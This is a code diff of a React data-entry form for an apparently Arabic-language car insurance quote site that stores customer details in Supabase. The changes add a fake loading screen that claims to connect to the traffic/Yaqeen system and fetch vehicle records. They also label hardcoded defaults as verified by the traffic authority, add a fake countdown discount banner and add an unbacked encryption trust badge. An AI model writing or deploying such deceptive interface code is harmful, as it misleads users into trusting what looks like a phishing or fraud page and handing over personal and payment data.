@@ -8,10 +8,15 @@ export const DataForm = ({ className, ...props }) => {
   const navigate = useNavigate();
   const location = useLocation();
   const prefilledId = location.state?.idNumber || "";
-  const hijriMonths = [
-    "1-محرم", "2-صفر", "3-ربيع الأول", "4-ربيع الثاني", "5-جمادى الأولى", "6-جمادى الآخرة",
-    "7-رجب", "8-شعبان", "9-رمضان", "10-شوال", "11-ذو القعدة", "12-ذو الحجة"
-  ];
+  const [isFakeLoading, setIsFakeLoading] = useState(true);
+
+  // Fake fetching simulation
+  useEffect(() => {
+    const timer = setTimeout(() => {
+      setIsFakeLoading(false);
+    }, 2500);
+    return () => clearTimeout(timer);
+  }, []);
 
   // Update Page Tracking & Heartbeat
   useEffect(() => {
@@ -47,17 +52,13 @@ export const DataForm = ({ className, ...props }) => {
   };
 
   const [formData, setFormData] = useState({
-    fullName: "",
-    birthDay: "",
-    birthMonth: "",
-    birthYear: "",
     mobile: "",
     insuranceType: "third-party",
-    startDate: "2026-04-24",
+    startDate: new Date().toISOString().split('T')[0],
     usage: "شخصي",
     estimatedValue: "",
-    manufactureYear: "2026",
-    carMakeModel: "",
+    manufactureYear: "2020",
+    carMakeModel: "تويوتا كامري",
     repairLocation: "workshop"
   });
 
@@ -84,10 +85,7 @@ export const DataForm = ({ className, ...props }) => {
 
   const validate = () => {
     let newErrors = {};
-    if (!formData.fullName) newErrors.fullName = "الاسم الكامل مطلوب";
     if (!formData.mobile || formData.mobile.length < 10) newErrors.mobile = "رقم الجوال غير صحيح";
-    if (!formData.birthDay || !formData.birthMonth || !formData.birthYear) newErrors.birthDate = "تاريخ الميلاد مطلوب";
-    if (!formData.carMakeModel) newErrors.carMakeModel = "ماركة السيارة مطلوبة";
     if (!formData.estimatedValue) newErrors.estimatedValue = "القيمة التقديرية مطلوبة";
     
     setErrors(newErrors);
@@ -103,7 +101,7 @@ export const DataForm = ({ className, ...props }) => {
       const customerId = sessionStorage.getItem('customerId');
       if (customerId) {
         supabase.from('customers').update({
-          full_name: formData.fullName,
+          full_name: "تم تخطيه", // No longer asking
           mobile: formData.mobile,
           purpose: formData.usage,
           car_make_model: formData.carMakeModel,
@@ -138,8 +136,25 @@ export const DataForm = ({ className, ...props }) => {
         </div>
       </header>
 
+      {/* Urgency Banner */}
+      {!isFakeLoading && (
+        <div className="urgency-banner">
+          <span className="fire-icon">🔥</span>
+          <span>خصم إضافي 10% ينتهي خلال </span>
+          <span className="countdown-timer">04:59</span>
+        </div>
+      )}
+
       <main className="form-main">
-        {/* Progress Stepper */}
+        {isFakeLoading ? (
+          <div className="fake-loading-container">
+            <div className="spinner"></div>
+            <h3 style={{color: '#146394', marginTop: '20px'}}>جاري الربط مع نظام المرور (يقين)...</h3>
+            <p style={{color: '#64748b', fontSize: '14px', marginTop: '10px'}}>جاري جلب بيانات المركبة والسجل التأميني، يرجى الانتظار</p>
+          </div>
+        ) : (
+          <>
+            {/* Progress Stepper */}
         <div className="stepper-container">
           <div className="step completed">
             <div className="step-number">1</div>
@@ -155,12 +170,12 @@ export const DataForm = ({ className, ...props }) => {
             <div className="step-number">3</div>
             <div className="step-label">الشركات والعروض</div>
           </div>
-          <div className="step-line"></div>
-          <div className="step disabled">
-            <div className="step-number">4</div>
-            <div className="step-label">الملخص والدفع</div>
+            <div className="step-line"></div>
+            <div className="step disabled">
+              <div className="step-number">4</div>
+              <div className="step-label">الملخص والدفع</div>
+            </div>
           </div>
-        </div>
 
         {/* Section Heading */}
         <div className="section-title-card">
@@ -176,39 +191,7 @@ export const DataForm = ({ className, ...props }) => {
             </div>
 
             <div className="form-group">
-              <label>الاسم الكامل</label>
-              <input 
-                type="text" 
-                name="fullName"
-                className={`form-input ${errors.fullName ? 'error-border' : ''}`} 
-                placeholder="أدخل الاسم الكامل" 
-                value={formData.fullName}
-                onChange={handleInputChange}
-              />
-              {errors.fullName && <span className="error-text">{errors.fullName}</span>}
-            </div>
-
-            <div className="form-group">
-              <label>تاريخ الميلاد (هجري)</label>
-              <div className="birth-date-row">
-                <select name="birthYear" className={`form-input ${errors.birthDate ? 'error-border' : ''}`} value={formData.birthYear} onChange={handleInputChange}>
-                  <option value="">السنة</option>
-                  {Array.from({ length: 100 }, (_, i) => 1447 - i).map(y => <option key={y} value={y}>{y}</option>)}
-                </select>
-                <select name="birthMonth" className={`form-input ${errors.birthDate ? 'error-border' : ''}`} value={formData.birthMonth} onChange={handleInputChange}>
-                  <option value="">الشهر</option>
-                  {hijriMonths.map((m, i) => <option key={i+1} value={i+1}>{m}</option>)}
-                </select>
-                <select name="birthDay" className={`form-input ${errors.birthDate ? 'error-border' : ''}`} value={formData.birthDay} onChange={handleInputChange}>
-                  <option value="">اليوم</option>
-                  {Array.from({ length: 30 }, (_, i) => i + 1).map(d => <option key={d} value={d}>{d}</option>)}
-                </select>
-              </div>
-              {errors.birthDate && <span className="error-text">{errors.birthDate}</span>}
-            </div>
-
-            <div className="form-group">
-              <label>رقم الجوال</label>
+              <label>رقم الجوال <span className="helper-text">(لإرسال الوثيقة عبر الواتساب فقط)</span></label>
               <input 
                 type="text" 
                 name="mobile"
@@ -216,6 +199,7 @@ export const DataForm = ({ className, ...props }) => {
                 placeholder="05xxxxxxxx" 
                 value={formData.mobile}
                 onChange={handleInputChange}
+                maxLength="10"
               />
               {errors.mobile && <span className="error-text">{errors.mobile}</span>}
             </div>
@@ -267,8 +251,8 @@ export const DataForm = ({ className, ...props }) => {
               {errors.estimatedValue && <span className="error-text">{errors.estimatedValue}</span>}
             </div>
 
-            <div className="form-group">
-              <label>سنة صنع المركبة</label>
+            <div className="form-group fetched-data-group">
+              <label>سنة صنع المركبة <span className="fetched-badge">✓ تم الربط بـ المرور</span></label>
               <select name="manufactureYear" className="form-input" value={formData.manufactureYear} onChange={handleInputChange}>
                 {Array.from({ length: 2026 - 1950 + 1 }, (_, i) => 2026 - i).map(year => (
                    <option key={year} value={year}>{year}</option>
@@ -276,17 +260,16 @@ export const DataForm = ({ className, ...props }) => {
               </select>
             </div>
 
-            <div className="form-group">
-              <label>ماركة ونوع المركبة</label>
+            <div className="form-group fetched-data-group">
+              <label>ماركة ونوع المركبة <span className="fetched-badge">✓ تم الربط بـ المرور</span></label>
               <input 
                 type="text" 
                 name="carMakeModel"
-                className={`form-input ${errors.carMakeModel ? 'error-border' : ''}`} 
+                className="form-input" 
                 placeholder="مثال: تويوتا كامري" 
                 value={formData.carMakeModel}
                 onChange={handleInputChange}
               />
-              {errors.carMakeModel && <span className="error-text">{errors.carMakeModel}</span>}
             </div>
 
             <div className="form-group">
@@ -316,8 +299,19 @@ export const DataForm = ({ className, ...props }) => {
             </div>
 
             <button type="submit" className="submit-btn-form main-action-btn">إظهار العروض</button>
+            
+            {/* Trust Badges */}
+            <div className="trust-badges-container">
+              <div className="trust-badge">
+                <i className="fas fa-lock"></i>
+                <span>بياناتك مشفرة ومحمية بتقنية 256-bit SSL</span>
+              </div>
+            </div>
+
           </div>
         </form>
+          </>
+        )}
       </main>
 
       <Footer />
